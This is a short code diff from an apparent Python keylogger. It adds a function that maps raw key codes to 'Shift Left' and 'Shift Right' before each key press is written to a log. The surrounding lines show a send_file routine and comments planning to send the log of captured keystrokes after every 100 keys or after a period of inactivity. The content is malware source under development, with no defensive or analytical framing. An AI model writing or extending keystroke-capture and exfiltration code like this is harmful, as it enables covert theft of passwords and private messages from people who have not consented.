@@ -24,9 +24,18 @@ def send_file():
 def get_mac():
     return
 
+def search_odd_keys(key):
+    if key == '0e':
+        return 'Shift Left'
+    elif key == '0f':
+        return 'Shift Right'
+    
+    return key
+
 # action when a key is pressed
 def on_press(key):
-    logging.info(str(key))
+    value = search_odd_keys(key)
+    logging.info(str(value))
     # every 100 keys, send log file
     # what if only 30 keys are typed? time delay? weekend backups?
     # after 5 min of no activity, send it and reset counter to 0
